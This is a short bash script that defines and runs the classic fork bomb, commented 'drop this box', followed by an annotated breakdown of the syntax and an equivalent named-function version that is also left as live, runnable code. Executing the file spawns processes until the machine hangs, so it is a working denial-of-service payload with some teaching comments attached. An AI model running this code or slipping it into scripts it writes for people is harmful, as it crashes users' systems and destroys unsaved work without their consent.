#!/bin/bash

## fork bomb for bash

# drop this box
:(){ :|: & };:


## explanation
# define a function called :
:() 

# run the function ":" and send the ouput into the ":" function again, 
# send this process to the backgroun with "&"
{:|: &} 

# ";" is a command seperator
# ":" runs this function for the first time
;:

# this could be written as:
function :() { 
	:|: &
}  
:
